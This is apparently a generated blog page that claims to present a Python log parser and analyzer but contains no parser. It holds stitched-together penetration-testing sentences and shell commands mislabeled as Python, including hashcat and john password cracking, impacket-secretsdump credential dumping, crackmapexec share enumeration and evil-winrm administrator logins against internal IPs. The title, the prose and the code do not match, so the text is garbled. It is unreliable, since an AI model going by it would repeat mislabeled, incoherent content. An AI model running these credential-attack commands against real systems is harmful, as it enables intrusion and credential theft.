---
TitleSEO: "Log Parser and Analyzer in Python | ZureFX"
TitlePost: "Log Parser and Analyzer — Python"
Author: "ZureFX"
Description: "A Python script for log parser and analyzer. Built for security research and automation."
Keywords: "tool, scanner, bash, automation, parser, python"
URL: "https://zurefx.github.io/scripting/script-log-parser-and-analyzer-722.html"
URL_IMAGES: ""
Date: "2025-05-14"
Tags: "Tool, Scanner, Bash, Automation, Parser, Python"
Section: "scripting"
Lang: "en"
main_img: "script-log-parser-and-analyzer-722"
Permalink: "/scripting/script-log-parser-and-analyzer-722.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The database credentials were hardcoded in the application source code. The service was running without proper input validation, leading to injection vulnerabilities. The web application was vulnerable to Server-Side Template Injection (SSTI).

Built with **Python** for offensive security automation.

### Requirements

- Python
- `kerbrute`
- `GetUserSPNs`
- `lookupsid`

## Implementation

### Core Logic

Post-exploitation enumeration revealed a path to domain administrator privileges. The database credentials were hardcoded in the application source code.

```python
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.61.196.110/FUZZ
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
evil-winrm -i 10.125.107.86 -u administrator -p 'P@ssw0rd!'
```

The service account had excessive permissions assigned in Active Directory. Network traffic analysis revealed unencrypted communications containing user credentials.

### Helper Functions

Authentication bypass was achieved through careful manipulation of the login mechanism. Token impersonation allowed elevation to SYSTEM privileges on the target.

```python
feroxbuster -h
crackmapexec smb 10.42.66.109 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.53.48.245
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Usage

### Basic Usage

The service was running without proper input validation, leading to injection vulnerabilities. Command injection was possible through unsanitized user input in the search functionality.

```bash
nmap -sCV -p27017,8080,110 10.78.59.131 -oN scan.txt
crackmapexec smb 10.66.53.227 -u administrator -p 'P@ssw0rd!' --shares
```

### Advanced Options

Network traffic analysis revealed unencrypted communications containing user credentials. The web application was vulnerable to Server-Side Template Injection (SSTI). The scheduled task ran with elevated privileges and could be abused for escalation.

```bash
gobuster dir -u http://10.50.146.237/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Output

### Example Output

Lateral movement was facilitated by reusing discovered credentials across services. The backup files contained sensitive information that should not have been accessible.

```
[+] Scanning target...
[+] Found 10 results
[+] Done in 21.17s
```
